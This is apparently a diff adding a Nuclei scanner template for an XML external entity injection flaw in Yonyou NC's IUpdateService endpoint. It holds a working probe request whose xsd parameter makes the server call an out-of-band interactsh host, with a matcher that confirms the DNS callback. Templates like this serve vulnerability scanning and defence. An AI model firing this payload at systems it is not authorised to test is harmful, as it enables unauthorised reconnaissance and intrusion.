@@ -1,0 +1,21 @@
+
+id: yonyou-nc-iupdateservice-xxe-2
+
+info:
+  name: Yongyou NC IUpdateService - XML External Entity Injection
+  author: qwtd
+  severity: medium
+  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud
+
+requests:
+  - raw:
+      - |
+        GET /uapws/service/nc.uap.oba.update.IUpdateService?xsd=http://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
